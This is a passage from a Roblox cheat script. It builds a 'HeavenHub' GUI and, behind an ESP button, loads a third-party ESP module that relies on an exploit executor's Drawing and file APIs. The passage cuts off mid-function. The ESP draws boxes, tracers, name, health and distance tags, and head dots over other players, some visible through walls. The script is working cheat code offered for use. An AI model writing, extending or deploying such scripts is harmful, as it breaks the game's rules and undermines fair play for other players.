TextLabel_5.Size = UDim2.new(0, 200, 0, 50)
TextLabel_5.Font = Enum.Font.GothamBold
TextLabel_5.Text = "HeavenHub"
TextLabel_5.TextColor3 = Color3.fromRGB(255, 255, 255)
TextLabel_5.TextSize = 20.000

Hub1.Name = "Hub1"
Hub1.Parent = _5
Hub1.BackgroundColor3 = Color3.fromRGB(232, 232, 232)
Hub1.Position = UDim2.new(0.664179087, 0, 0.150000006, 0)
Hub1.Size = UDim2.new(0, 76, 0, 33)
Hub1.Font = Enum.Font.SourceSans
Hub1.Text = ""
Hub1.TextColor3 = Color3.fromRGB(0, 0, 0)
Hub1.TextSize = 14.000
Hub1.MouseButton1Click:Connect(function()
	HUB.Visible = true
end)

UICorner_15.Parent = Hub1

Hub2.Name = "Hub2"
Hub2.Parent = Hub1
Hub2.BackgroundTransparency = 1.000
Hub2.Position = UDim2.new(0.328947365, 0, 0.227272719, 0)
Hub2.Size = UDim2.new(0, 25, 0, 25)
Hub2.ZIndex = 2
Hub2.Image = "rbxassetid://3926305904"
Hub2.ImageColor3 = Color3.fromRGB(153, 153, 153)
Hub2.ImageRectOffset = Vector2.new(4, 804)
Hub2.ImageRectSize = Vector2.new(36, 36)
Hub2.MouseButton1Click:Connect(function()
	HUB.Visible = true
end)


TextButton_3.Parent = _5
TextButton_3.BackgroundColor3 = Color3.fromRGB(211, 211, 211)
TextButton_3.Position = UDim2.new(0.664179087, 0, 0.150000006, 0)
TextButton_3.Size = UDim2.new(0, 76, 0, 42)
TextButton_3.ZIndex = 0
TextButton_3.Font = Enum.Font.SourceSans
TextButton_3.Text = ""
TextButton_3.TextColor3 = Color3.fromRGB(0, 0, 0)
TextButton_3.TextSize = 14.000

UICorner_16.Parent = TextButton_3

Frame_5.Parent = Drag
Frame_5.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
Frame_5.BackgroundTransparency = 0.350
Frame_5.Position = UDim2.new(0.0652818978, 0, 0.0310077518, 0)
Frame_5.Size = UDim2.new(0, 293, 0, 59)

UICorner_17.Parent = Frame_5

TextButton_4.Parent = Frame_5
TextButton_4.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
TextButton_4.BackgroundTransparency = 1.000
TextButton_4.Position = UDim2.new(0.075085327, 0, 0.0163214728, 0)
TextButton_4.Size = UDim2.new(0, 249, 0, 66)
TextButton_4.Font = Enum.Font.SourceSansBold
TextButton_4.Text = "Heaven V1.9 | :)"
TextButton_4.TextColor3 = Color3.fromRGB(43, 40, 40)
TextButton_4.TextSize = 30.000

TextButton_5.Parent = Frame_5
TextButton_5.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
TextButton_5.BackgroundTransparency = 1.000
TextButton_5.Position = UDim2.new(0.075085327, 0, -0.0677966103, 0)
TextButton_5.Size = UDim2.new(0, 249, 0, 63)
TextButton_5.Font = Enum.Font.SourceSansBold
TextButton_5.Text = "Heaven V1.9 | :)"
TextButton_5.TextColor3 = Color3.fromRGB(239, 239, 239)
TextButton_5.TextSize = 30.000

HUB.Name = "HUB"
HUB.Parent = Es
HUB.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
HUB.Position = UDim2.new(0.648078382, 0, 0.243574053, 0)
HUB.Size = UDim2.new(0, 364, 0, 371)
HUB.Visible = false
HUB.Active = true
HUB.Draggable = true

UICorner_18.Parent = HUB

UIGradient_2.Color = ColorSequence.new{ColorSequenceKeypoint.new(0.00, Color3.fromRGB(255, 255, 255)), ColorSequenceKeypoint.new(0.75, Color3.fromRGB(170, 255, 255)), ColorSequenceKeypoint.new(1.00, Color3.fromRGB(255, 255, 255))}
UIGradient_2.Parent = HUB

Glow_2.Name = "Glow"
Glow_2.Parent = HUB
Glow_2.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Glow_2.BackgroundTransparency = 1.000
Glow_2.Position = UDim2.new(0, -15, 0, -16)
Glow_2.Size = UDim2.new(1, 30, 1.0008111, 30)
Glow_2.ZIndex = -2
Glow_2.Image = "rbxassetid://5028857084"
Glow_2.ScaleType = Enum.ScaleType.Slice
Glow_2.SliceCenter = Rect.new(24, 24, 276, 276)

ESP.Name = "ESP"
ESP.Parent = HUB
ESP.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
ESP.BackgroundTransparency = 0.250
ESP.Position = UDim2.new(0.068681322, 0, 0.0646900237, 0)
ESP.Size = UDim2.new(0, 313, 0, 50)
ESP.Font = Enum.Font.GothamBold
ESP.Text = "ESP"
ESP.TextColor3 = Color3.fromRGB(255, 255, 255)
ESP.TextSize = 14.000
ESP.MouseButton1Click:Connect(function()
	-- Unnamed ESP

	assert(Drawing, 'exploit not supported')

	local UserInputService = game:GetService'UserInputService';
	local HttpService = game:GetService'HttpService';
	local GUIService = game:GetService'GuiService';
	local RunService = game:GetService'RunService';
	local Players = game:GetService'Players';
	local LocalPlayer = Players.LocalPlayer;
	local Camera = workspace.CurrentCamera
	local Mouse = LocalPlayer:GetMouse();
	local Menu = {};
	local MouseHeld = false;
	local LastRefresh = 0;
	local OptionsFile = 'IC3_ESP_SETTINGS.dat';
	local Binding = false;
	local BindedKey = nil;
	local OIndex = 0;
	local LineBox = {};
	local UIButtons = {};
	local Sliders = {};
	local Dragging = false;
	local DraggingUI = false;
	local DragOffset = Vector2.new();
	local DraggingWhat = nil;
	local OldData = {};
	local IgnoreList = {};
	local Red = Color3.new(1, 0, 0);
	local Green = Color3.new(0, 1, 0);
	local MenuLoaded = false;

	shared.MenuDrawingData = shared.MenuDrawingData or { Instances = {} };
	shared.PlayerData = shared.PlayerData or {};
	shared.RSName = shared.RSName or ('UnnamedESP_by_ic3-' .. HttpService:GenerateGUID(false));

	local GetDataName = shared.RSName .. '-GetData';
	local UpdateName = shared.RSName .. '-Update';

	local Debounce = setmetatable({}, {
		__index = function(t, i)
			return rawget(t, i) or false
		end;
	});

	pcall(function() shared.InputBeganCon:disconnect() end);
	pcall(function() shared.InputEndedCon:disconnect() end);

	function GetMouseLocation()
		return UserInputService:GetMouseLocation();
	end

	function MouseHoveringOver(Values)
		local X1, Y1, X2, Y2 = Values[1], Values[2], Values[3], Values[4]
		local MLocation = GetMouseLocation();
		return (MLocation.x >= X1 and MLocation.x <= (X1 + (X2 - X1))) and (MLocation.y >= Y1 and MLocation.y <= (Y1 + (Y2 - Y1)));
	end

	function GetTableData(t) -- basically table.foreach i dont even know why i made this
		if typeof(t) ~= 'table' then return end
		return setmetatable(t, {
			__call = function(t, func)
				if typeof(func) ~= 'function' then return end;
				for i, v in pairs(t) do
					pcall(func, i, v);
				end
			end;
		});
	end
	local function Format(format, ...)
		return string.format(format, ...);
	end
	function CalculateValue(Min, Max, Percent)
		return Min + math.floor(((Max - Min) * Percent) + .5);
	end

	local Options = setmetatable({}, {
		__call = function(t, ...)
			local Arguments = {...};
			local Name = Arguments[1];
			OIndex = OIndex + 1; -- (typeof(Arguments[3]) == 'boolean' and 1 or 0);
			rawset(t, Name, setmetatable({
				Name = Arguments[1];
				Text = Arguments[2];
				Value = Arguments[3];
				DefaultValue = Arguments[3];
				AllArgs = Arguments;
				Index = OIndex;
			}, {
				__call = function(t, v)
					if typeof(t.Value) == 'function' then
						t.Value();
					elseif typeof(t.Value) == 'EnumItem' then
						local BT = Menu:GetInstance(Format('%s_BindText', t.Name));
						Binding = true;
						local Val = 0
						while Binding do
							wait();
							Val = (Val + 1) % 17;
							BT.Text = Val <= 8 and '|' or '';
						end
						t.Value = BindedKey;
						BT.Text = tostring(t.Value):match'%w+%.%w+%.(.+)';
						BT.Position = t.BasePosition + Vector2.new(t.BaseSize.X - BT.TextBounds.X - 20, -10);
					else
						local NewValue = v;
						if NewValue == nil then NewValue = not t.Value; end
						rawset(t, 'Value', NewValue);
						if Arguments[2] ~= nil then
							if typeof(Arguments[3]) == 'number' then
								local AMT = Menu:GetInstance(Format('%s_AmountText', t.Name));
								AMT.Text = tostring(t.Value);
								AMT.Position = t.BasePosition + Vector2.new(t.BaseSize.X - AMT.TextBounds.X - 10, -10);
							else
								local Inner = Menu:GetInstance(Format('%s_InnerCircle', t.Name));
								Inner.Visible = t.Value;
							end
						end
					end
				end;
			}));
		end;
	})

	function Load()
		local _, Result = pcall(readfile, OptionsFile);
		if _ then -- extremely ugly code yea i know but i dont care p.s. i hate pcall
			local _, Table = pcall(HttpService.JSONDecode, HttpService, Result);
			if _ then
				for i, v in pairs(Table) do
					if Options[i] ~= nil and Options[i].Value ~= nil and (typeof(Options[i].Value) == 'boolean' or typeof(Options[i].Value) == 'number') then
						Options[i].Value = v.Value;
						pcall(Options[i], v.Value);
					end
				end
			end
		end
	end

	Options('Enabled', 'ESP Enabled', true);
	Options('ShowTeam', 'Show Team', false);
	Options('ShowName', 'Show Names', true);
	Options('ShowDistance', 'Show Distance', true);
	Options('ShowHealth', 'Show Health', true);
	Options('ShowBoxes', 'Show Boxes', true);
	Options('ShowTracers', 'Show Tracers', true);
	Options('ShowDot', 'Show Head Dot', false);
	Options('VisCheck', 'Visibility Check', false);
	Options('Crosshair', 'Crosshair', false);
	Options('TextOutline', 'Text Outline', true);
	Options('TextSize', 'Text Size', syn and 18 or 14, 10, 24); -- cuz synapse fonts look weird???
	Options('MaxDistance', 'Max Distance', 2500, 100, 5000);
	Options('RefreshRate', 'Refresh Rate (ms)', 5, 1, 200);
	Options('MenuKey', 'Menu Key', Enum.KeyCode.F4, 1);
	Options('ResetSettings', 'Reset Settings', function()
		for i, v in pairs(Options) do
			if Options[i] ~= nil and Options[i].Value ~= nil and Options[i].Text ~= nil and (typeof(Options[i].Value) == 'boolean' or typeof(Options[i].Value) == 'number') then
				Options[i](Options[i].DefaultValue);
			end
		end
	end, 4);
	Options('LoadSettings', 'Load Settings', Load, 3);
	Options('SaveSettings', 'Save Settings', function()
		writefile(OptionsFile, HttpService:JSONEncode(Options));
	end, 2)
	-- Options.SaveSettings.Value();

	Load();

	Options('MenuOpen', nil, true);

	local function Set(t, i, v)
		t[i] = v;
	end
	local function Combine(...)
		local Output = {};
		for i, v in pairs{...} do
			if typeof(v) == 'table' then
				table.foreach(v, function(i, v)
					Output[i] = v;
				end)
			end
		end
		return Output
	end
	function IsStringEmpty(String)
		if type(String) == 'string' then
			return String:match'^%s+$' ~= nil or #String == 0 or String == '' or false;
		end
		return false
	end

	function NewDrawing(InstanceName)
		local Instance = Drawing.new(InstanceName);
		return (function(Properties)
			for i, v in pairs(Properties) do
				pcall(Set, Instance, i, v);
			end
			return Instance;
		end)
	end

	function Menu:AddMenuInstace(Name, Instance)
		if shared.MenuDrawingData.Instances[Name] ~= nil then
			shared.MenuDrawingData.Instances[Name]:Remove();
		end
		shared.MenuDrawingData.Instances[Name] = Instance;
		return Instance;
	end
	function Menu:UpdateMenuInstance(Name)
		local Instance = shared.MenuDrawingData.Instances[Name];
		if Instance ~= nil then
			return (function(Properties)
				for i, v in pairs(Properties) do
					-- print(Format('%s %s -> %s', Name, tostring(i), tostring(v)));
					pcall(Set, Instance, i, v);
				end
				return Instance;
			end)
		end
	end
	function Menu:GetInstance(Name)
		return shared.MenuDrawingData.Instances[Name];
	end

	function LineBox:Create(Properties)
		local Box = { Visible = true }; -- prevent errors not really though dont worry bout the Visible = true thing

		local Properties = Combine({
			Transparency = 1;
			Thickness = 1;
			Visible = true;
		}, Properties);

		Box['TopLeft'] = NewDrawing'Line'(Properties);
		Box['TopRight'] = NewDrawing'Line'(Properties);
		Box['BottomLeft'] = NewDrawing'Line'(Properties);
		Box['BottomRight'] = NewDrawing'Line'(Properties);

		function Box:Update(CF, Size, Color, Properties)
			if not CF or not Size then return end

			local TLPos, Visible1 = Camera:WorldToViewportPoint((CF * CFrame.new( Size.X,  Size.Y, 0)).p);
			local TRPos, Visible2 = Camera:WorldToViewportPoint((CF * CFrame.new(-Size.X,  Size.Y, 0)).p);
			local BLPos, Visible3 = Camera:WorldToViewportPoint((CF * CFrame.new( Size.X, -Size.Y, 0)).p);
			local BRPos, Visible4 = Camera:WorldToViewportPoint((CF * CFrame.new(-Size.X, -Size.Y, 0)).p);
			-- ## BEGIN UGLY CODE
			if Visible1 then
				Box['TopLeft'].Visible = true;
				Box['TopLeft'].Color = Color;
				Box['TopLeft'].From = Vector2.new(TLPos.X, TLPos.Y);
				Box['TopLeft'].To = Vector2.new(TRPos.X, TRPos.Y);
			else
				Box['TopLeft'].Visible = false;
			end
			if Visible2 then
				Box['TopRight'].Visible = true;
				Box['TopRight'].Color = Color;
				Box['TopRight'].From = Vector2.new(TRPos.X, TRPos.Y);
				Box['TopRight'].To = Vector2.new(BRPos.X, BRPos.Y);
			else
				Box['TopRight'].Visible = false;
			end
			if Visible3 then
				Box['BottomLeft'].Visible = true;
				Box['BottomLeft'].Color = Color;
				Box['BottomLeft'].From = Vector2.new(BLPos.X, BLPos.Y);
				Box['BottomLeft'].To = Vector2.new(TLPos.X, TLPos.Y);
			else
				Box['BottomLeft'].Visible = false;
			end
			if Visible4 then
				Box['BottomRight'].Visible = true;
				Box['BottomRight'].Color = Color;
				Box['BottomRight'].From = Vector2.new(BRPos.X, BRPos.Y);
				Box['BottomRight'].To = Vector2.new(BLPos.X, BLPos.Y);
			else
				Box['BottomRight'].Visible = false;
			end
			-- ## END UGLY CODE
			if Properties then
				GetTableData(Properties)(function(i, v)
					pcall(Set, Box['TopLeft'], i, v);
					pcall(Set, Box['TopRight'], i, v);
					pcall(Set, Box['BottomLeft'], i, v);
					pcall(Set, Box['BottomRight'], i, v);
				end)
			end
		end
		function Box:SetVisible(bool)
			pcall(Set, Box['TopLeft'], 'Visible', bool);
			pcall(Set, Box['TopRight'], 'Visible', bool);
			pcall(Set, Box['BottomLeft'], 'Visible', bool);
			pcall(Set, Box['BottomRight'], 'Visible', bool);
		end
		function Box:Remove()
			self:SetVisible(false);
			Box['TopLeft']:Remove();
			Box['TopRight']:Remove();
			Box['BottomLeft']:Remove();
			Box['BottomRight']:Remove();
		end

		return Box;
	end

	function CreateMenu(NewPosition) -- Create Menu
		local function FromHex(HEX)
			HEX = HEX:gsub('#', '');
			return Color3.fromRGB(tonumber('0x' .. HEX:sub(1, 2)), tonumber('0x' .. HEX:sub(3, 4)), tonumber('0x' .. HEX:sub(5, 6)));
		end

		local Colors = {
			Primary = {
				Main = FromHex'424242';
				Light = FromHex'6d6d6d';
				Dark = FromHex'1b1b1b';
			};
			Secondary = {
				Main = FromHex'e0e0e0';
				Light = FromHex'ffffff';
				Dark = FromHex'aeaeae';
			};
		};

		MenuLoaded = false;

		GetTableData(UIButtons)(function(i, v)
			v.Instance.Visible = false;
			v.Instance:Remove();
		end)
		GetTableData(Sliders)(function(i, v)
			v.Instance.Visible = false;
			v.Instance:Remove();
		end)

		UIButtons = {};
		Sliders = {};

		local BaseSize = Vector2.new(300, 580);
		local BasePosition = NewPosition or Vector2.new(Camera.ViewportSize.X / 8 - (BaseSize.X / 2), Camera.ViewportSize.Y / 2 - (BaseSize.Y / 2));

		Menu:AddMenuInstace('CrosshairX', NewDrawing'Line'{
			Visible = false;
			Color = Color3.new(0, 1, 0);
			Transparency = 1;
			Thickness = 1;
		});
		Menu:AddMenuInstace('CrosshairY', NewDrawing'Line'{
			Visible = false;
			Color = Color3.new(0, 1, 0);
			Transparency = 1;
			Thickness = 1;
		});

		delay(.025, function() -- since zindex doesnt exist
			Menu:AddMenuInstace('Main', NewDrawing'Square'{
				Size = BaseSize;
				Position = BasePosition;
				Filled = false;
				Color = Colors.Primary.Main;
				Thickness = 3;
				Visible = true;
			});
		end);
		Menu:AddMenuInstace('TopBar', NewDrawing'Square'{
			Position = BasePosition;
			Size = Vector2.new(BaseSize.X, 25);
			Color = Colors.Primary.Dark;
			Filled = true;
			Visible = true;
		});
		Menu:AddMenuInstace('TopBarTwo', NewDrawing'Square'{
			Position = BasePosition + Vector2.new(0, 25);
			Size = Vector2.new(BaseSize.X, 60);
			Color = Colors.Primary.Main;
			Filled = true;
			Visible = true;
		});
		Menu:AddMenuInstace('TopBarText', NewDrawing'Text'{
			Size = 25;
			Position = shared.MenuDrawingData.Instances.TopBarTwo.Position + Vector2.new(25, 15);
			Text = 'Unnamed ESP';
			Color = Colors.Secondary.Light;
			Visible = true;
		});
		Menu:AddMenuInstace('TopBarTextBR', NewDrawing'Text'{
			Size = 15;
			Position = shared.MenuDrawingData.Instances.TopBarTwo.Position + Vector2.new(BaseSize.X - 65, 40);
			Text = 'by ic3w0lf';
			Color = Colors.Secondary.Dark;
			Visible = true;
		});
		Menu:AddMenuInstace('Filling', NewDrawing'Square'{
			Size = BaseSize - Vector2.new(0, 85);
			Position = BasePosition + Vector2.new(0, 85);
			Filled = true;
			Color = Colors.Secondary.Main;
			Transparency= .5;
			Visible = true;
		});

		local CPos = 0;

		GetTableData(Options)(function(i, v)
			if typeof(v.Value) == 'boolean' and not IsStringEmpty(v.Text) and v.Text ~= nil then
				CPos = CPos + 25;
				local BaseSize = Vector2.new(BaseSize.X, 30);
				local BasePosition = shared.MenuDrawingData.Instances.Filling.Position + Vector2.new(30, v.Index * 25 - 10);
				UIButtons[#UIButtons + 1] = {
					Option = v;
					Instance = Menu:AddMenuInstace(Format('%s_Hitbox', v.Name), NewDrawing'Square'{
						Position = BasePosition - Vector2.new(30, 15);
						Size = BaseSize;
						Visible = false;
					});
				};
				Menu:AddMenuInstace(Format('%s_OuterCircle', v.Name), NewDrawing'Circle'{
					Radius = 10;
					Position = BasePosition;
					Color = Colors.Secondary.Light;
					Filled = true;
					Visible = true;
				});
				Menu:AddMenuInstace(Format('%s_InnerCircle', v.Name), NewDrawing'Circle'{
					Radius = 7;
					Position = BasePosition;
					Color = Colors.Secondary.Dark;
					Filled = true;
					Visible = v.Value;
				});
				Menu:AddMenuInstace(Format('%s_Text', v.Name), NewDrawing'Text'{
					Text = v.Text;
					Size = 20;
					Position = BasePosition + Vector2.new(20, -10);
					Visible = true;
					Color = Colors.Primary.Dark;
				});
			end
		end)
		GetTableData(Options)(function(i, v) -- just to make sure certain things are drawn before or after others, too lazy to actually sort table
			if typeof(v.Value) == 'number' then
				CPos = CPos + 25;

				local BaseSize = Vector2.new(BaseSize.X, 30);
				local BasePosition = shared.MenuDrawingData.Instances.Filling.Position + Vector2.new(0, CPos - 10);

				local Text = Menu:AddMenuInstace(Format('%s_Text', v.Name), NewDrawing'Text'{
					Text = v.Text;
					Size = 20;
					Position = BasePosition + Vector2.new(20, -10);
					Visible = true;
					Color = Colors.Primary.Dark;
				});
				local AMT = Menu:AddMenuInstace(Format('%s_AmountText', v.Name), NewDrawing'Text'{
					Text = tostring(v.Value);
					Size = 20;
					Position = BasePosition;
					Visible = true;
					Color = Colors.Primary.Dark;
				});
				local Line = Menu:AddMenuInstace(Format('%s_SliderLine', v.Name), NewDrawing'Line'{
					Transparency = 1;
					Color = Colors.Primary.Dark;
					Thickness = 3;
					Visible = true;
					From = BasePosition + Vector2.new(20, 20);
					To = BasePosition + Vector2.new(BaseSize.X - 10, 20);
				});
				CPos = CPos + 10;
				local Slider = Menu:AddMenuInstace(Format('%s_Slider', v.Name), NewDrawing'Circle'{
					Visible = true;
					Filled = true;
					Radius = 6;
					Color = Colors.Secondary.Dark;
					Position = BasePosition + Vector2.new(35, 20);
				})

				local CSlider = {Slider = Slider; Line = Line; Min = v.AllArgs[4]; Max = v.AllArgs[5]; Option = v};
				Sliders[#Sliders + 1] = CSlider;

				-- local Percent = (v.Value / CSlider.Max) * 100;
				-- local Size = math.abs(Line.From.X - Line.To.X);
				-- local Value = Size * (Percent / 100); -- this shit's inaccurate but fuck it i'm not even gonna bother fixing it

				Slider.Position = BasePosition + Vector2.new(40, 20);

				v.BaseSize = BaseSize;
				v.BasePosition = BasePosition;
				AMT.Position = BasePosition + Vector2.new(BaseSize.X - AMT.TextBounds.X - 10, -10)
			end
		end)
		GetTableData(Options)(function(i, v) -- just to make sure certain things are drawn before or after others, too lazy to actually sort table
			if typeof(v.Value) == 'EnumItem' then
				CPos = CPos + 30;

				local BaseSize = Vector2.new(BaseSize.X, 30);
				local BasePosition = shared.MenuDrawingData.Instances.Filling.Position + Vector2.new(0, CPos - 10);

				UIButtons[#UIButtons + 1] = {
					Option = v;
					Instance = Menu:AddMenuInstace(Format('%s_Hitbox', v.Name), NewDrawing'Square'{
						Size = Vector2.new(BaseSize.X, 20) - Vector2.new(30, 0);
						Visible = true;
						Transparency= .5;
						Position = BasePosition + Vector2.new(15, -10);
						Color = Colors.Secondary.Light;
						Filled = true;
					});
				};
				local Text = Menu:AddMenuInstace(Format('%s_Text', v.Name), NewDrawing'Text'{
					Text = v.Text;
					Size = 20;
					Position = BasePosition + Vector2.new(20, -10);
					Visible = true;
					Color = Colors.Primary.Dark;
				});
				local BindText = Menu:AddMenuInstace(Format('%s_BindText', v.Name), NewDrawing'Text'{
					Text = tostring(v.Value):match'%w+%.%w+%.(.+)';
					Size = 20;
					Position = BasePosition;
					Visible = true;
					Color = Colors.Primary.Dark;
				});

				Options[i].BaseSize = BaseSize;
				Options[i].BasePosition = BasePosition;
				BindText.Position = BasePosition + Vector2.new(BaseSize.X - BindText.TextBounds.X - 20, -10);
			end
		end)
		GetTableData(Options)(function(i, v) -- just to make sure certain things are drawn before or after others, too lazy to actually sort table
			if typeof(v.Value) == 'function' then
				local BaseSize = Vector2.new(BaseSize.X, 30);
				local BasePosition = shared.MenuDrawingData.Instances.Filling.Position + Vector2.new(0, CPos + (25 * v.AllArgs[4]) - 35);

				UIButtons[#UIButtons + 1] = {
					Option = v;
					Instance = Menu:AddMenuInstace(Format('%s_Hitbox', v.Name), NewDrawing'Square'{
						Size = Vector2.new(BaseSize.X, 20) - Vector2.new(30, 0);
						Visible = true;
						Transparency= .5;
						Position = BasePosition + Vector2.new(15, -10);
						Color = Colors.Secondary.Light;
						Filled = true;
					});
				};
				local Text = Menu:AddMenuInstace(Format('%s_Text', v.Name), NewDrawing'Text'{
					Text = v.Text;
					Size = 20;
					Position = BasePosition + Vector2.new(20, -10);
					Visible = true;
					Color = Colors.Primary.Dark;
				});

				-- BindText.Position = BasePosition + Vector2.new(BaseSize.X - BindText.TextBounds.X - 10, -10);
			end
		end)

		delay(.1, function()
			MenuLoaded = true;
		end);

		-- this has to be at the bottom cuz proto drawing api doesnt have zindex :triumph:
		Menu:AddMenuInstace('Cursor1', NewDrawing'Line'{
			Visible = false;
			Color = Color3.new(1, 0, 0);
			Transparency = 1;
			Thickness = 2;
		});
		Menu:AddMenuInstace('Cursor2', NewDrawing'Line'{
			Visible = false;
			Color = Color3.new(1, 0, 0);
			Transparency = 1;
			Thickness = 2;
		});
		Menu:AddMenuInstace('Cursor3', NewDrawing'Line'{
			Visible = false;
			Color = Color3.new(1, 0, 0);
			Transparency = 1;
			Thickness = 2;
		});
	end

	CreateMenu();

	shared.InputBeganCon = UserInputService.InputBegan:connect(function(input)
		if input.UserInputType.Name == 'MouseButton1' and Options.MenuOpen.Value then
			MouseHeld = true;
			local Bar = Menu:GetInstance'TopBar';
			local Values = {
				Bar.Position.X;
				Bar.Position.Y;
				Bar.Position.X + Bar.Size.X;
				Bar.Position.Y + Bar.Size.Y;
			}
			if MouseHoveringOver(Values) and not syn then -- disable dragging for synapse cuz idk why it breaks
				DraggingUI = false; -- also breaks for other exploits
				DragOffset = Menu:GetInstance'Main'.Position - GetMouseLocation();
			else
				for i, v in pairs(Sliders) do
					local Values = {
						v.Line.From.X - (v.Slider.Radius);
						v.Line.From.Y - (v.Slider.Radius);
						v.Line.To.X + (v.Slider.Radius);
						v.Line.To.Y + (v.Slider.Radius);
					};
					if MouseHoveringOver(Values) then
						DraggingWhat = v;
						Dragging = true;
						break
					end
				end
			end
		end
	end)
	shared.InputEndedCon = UserInputService.InputEnded:connect(function(input)
		if input.UserInputType.Name == 'MouseButton1' and Options.MenuOpen.Value then
			MouseHeld = false;
			for i, v in pairs(UIButtons) do
				local Values = {
					v.Instance.Position.X;
					v.Instance.Position.Y;
					v.Instance.Position.X + v.Instance.Size.X;
					v.Instance.Position.Y + v.Instance.Size.Y;
				};
				if MouseHoveringOver(Values) then
					v.Option();
					break -- prevent clicking 2 options
				end
			end
		elseif input.UserInputType.Name == 'Keyboard' then
			if Binding then
				BindedKey = input.KeyCode;
				Binding = false;
			elseif input.KeyCode == Options.MenuKey.Value or (input.KeyCode == Enum.KeyCode.Home and UserInputService:IsKeyDown(Enum.KeyCode.LeftControl)) then
				Options.MenuOpen();
			end
		end
	end)

	function ToggleMenu()
		if Options.MenuOpen.Value then
			GetTableData(shared.MenuDrawingData.Instances)(function(i, v)
				if OldData[v] then
					pcall(Set, v, 'Visible', true);
				end
			end)
		else
			-- GUIService:SetMenuIsOpen(false);
			GetTableData(shared.MenuDrawingData.Instances)(function(i, v)
				if v.Visible == true then
					OldData[v] = true;
					pcall(Set, v, 'Visible', false);
				end
			end)
		end
	end

	function CheckRay(Player, Distance, Position, Unit)
		local Pass = true;

		if Distance > 999 then return false; end

		local _Ray = Ray.new(Position, Unit * Distance);

		local List = {LocalPlayer.Character, Camera, Mouse.TargetFilter};

		for i,v in pairs(IgnoreList) do table.insert(List, v); end;

		local Hit = workspace:FindPartOnRayWithIgnoreList(_Ray, List);
		if Hit and not Hit:IsDescendantOf(Player.Character) then
			Pass = false;
			if Hit.Transparency >= .3 or not Hit.CanCollide and Hit.ClassName ~= Terrain then -- Detect invisible walls
				IgnoreList[#IgnoreList + 1] = Hit;
			end
		end

		return Pass;
	end

	function CheckPlayer(Player)
		if not Options.Enabled.Value then return false end

		local Pass = true;
		local Distance = 0;

		if Player ~= LocalPlayer and Player.Character then
			if not Options.ShowTeam.Value and Player.TeamColor == LocalPlayer.TeamColor then
				Pass = false;
			end

			local Head = Player.Character:FindFirstChild'Head';

			if Pass and Player.Character and Head then
				Distance = (Camera.CFrame.p - Head.Position).magnitude;
				if Options.VisCheck.Value then
					Pass = CheckRay(Player, Distance, Camera.CFrame.p, (Head.Position - Camera.CFrame.p).unit);
				end
				if Distance > Options.MaxDistance.Value then
					Pass = false;
				end
			end
		else
			Pass = false;
		end

		return Pass, Distance;
	end

	function UpdatePlayerData()
		if (tick() - LastRefresh) > (Options.RefreshRate.Value / 1000) then
			LastRefresh = tick();
			for i, v in pairs(Players:GetPlayers()) do
				local Data = shared.PlayerData[v.Name] or { Instances = {} };

				Data.Instances['Box'] = Data.Instances['Box'] or LineBox:Create{Thickness = 3};
				Data.Instances['Tracer'] = Data.Instances['Tracer'] or NewDrawing'Line'{
					Transparency = 1;
					Thickness = 2;
				}
				Data.Instances['HeadDot'] = Data.Instances['HeadDot'] or NewDrawing'Circle'{
					Filled = true;
					NumSides = 30;
				}
				Data.Instances['NameTag'] = Data.Instances['NameTag'] or NewDrawing'Text'{
					Size = Options.TextSize.Value;
					Center = true;
					Outline = Options.TextOutline.Value;
					Visible = true;
				};
				Data.Instances['DistanceHealthTag'] = Data.Instances['DistanceHealthTag'] or NewDrawing'Text'{
					Size = Options.TextSize.Value - 1;
					Center = true;
					Outline = Options.TextOutline.Value;
					Visible = true;
				};

				local NameTag = Data.Instances['NameTag'];
				local DistanceTag = Data.Instances['DistanceHealthTag'];
				local Tracer = Data.Instances['Tracer'];
				local HeadDot = Data.Instances['HeadDot'];
				local Box = Data.Instances['Box'];

				local Pass, Distance = CheckPlayer(v);

				if Pass and v.Character then
					Data.LastUpdate = tick();
					local Humanoid = v.Character:FindFirstChildOfClass'Humanoid';
					local Head = v.Character:FindFirstChild'Head';
					local HumanoidRootPart = v.Character:FindFirstChild'HumanoidRootPart';
					if v.Character ~= nil and Head then
						local ScreenPosition, Vis = Camera:WorldToViewportPoint(Head.Position);
						if Vis then
							local Color = v.TeamColor == LocalPlayer.TeamColor and Green or Red;

							local ScreenPositionUpper = Camera:WorldToViewportPoint(Head.CFrame * CFrame.new(0, Head.Size.Y, 0).p);
							local Scale = Head.Size.Y / 2;

							if Options.ShowName.Value then
								NameTag.Visible = true;
								NameTag.Text = v.Name;
								NameTag.Size = Options.TextSize.Value;
								NameTag.Outline = Options.TextOutline.Value;
								NameTag.Position = Vector2.new(ScreenPositionUpper.X, ScreenPositionUpper.Y);
								NameTag.Color = Color;
								if Drawing.Fonts then -- CURRENTLY SYNAPSE ONLY :MEGAHOLY:
									NameTag.Font = Drawing.Fonts.UI;
								end
							else
								NameTag.Visible = false;
							end
							if Options.ShowDistance.Value or Options.ShowHealth.Value then
								DistanceTag.Visible = true;
								DistanceTag.Size = Options.TextSize.Value - 1;
								DistanceTag.Outline = Options.TextOutline.Value;
								DistanceTag.Color = Color3.new(1, 1, 1);
								if Drawing.Fonts then -- CURRENTLY SYNAPSE ONLY :MEGAHOLY:
									NameTag.Font = Drawing.Fonts.UI;
								end

								local Str = '';

								if Options.ShowDistance.Value then
									Str = Str .. Format('[%d] ', Distance);
								end
								if Options.ShowHealth.Value and Humanoid then
									Str = Str .. Format('[%d/100]', Humanoid.Health / Humanoid.MaxHealth * 100);
								end

								DistanceTag.Text = Str;
								DistanceTag.Position = Vector2.new(ScreenPositionUpper.X, ScreenPositionUpper.Y) + Vector2.new(0, NameTag.Size);
							else
								DistanceTag.Visible = false;
							end
							if Options.ShowDot.Value then
								local Top = Camera:WorldToViewportPoint((Head.CFrame * CFrame.new(0, Scale, 0)).p);
								local Bottom = Camera:WorldToViewportPoint((Head.CFrame * CFrame.new(0, -Scale, 0)).p);
								local Radius = (Top - Bottom).y;

								HeadDot.Visible = true;
								HeadDot.Color = Color;
								HeadDot.Position = Vector2.new(ScreenPosition.X, ScreenPosition.Y);
								HeadDot.Radius = Radius;
							else
								HeadDot.Visible = false;
							end
							if Options.ShowTracers.Value then
								Tracer.Visible = true;
								Tracer.From = Vector2.new(Camera.ViewportSize.X / 2, Camera.ViewportSize.Y);
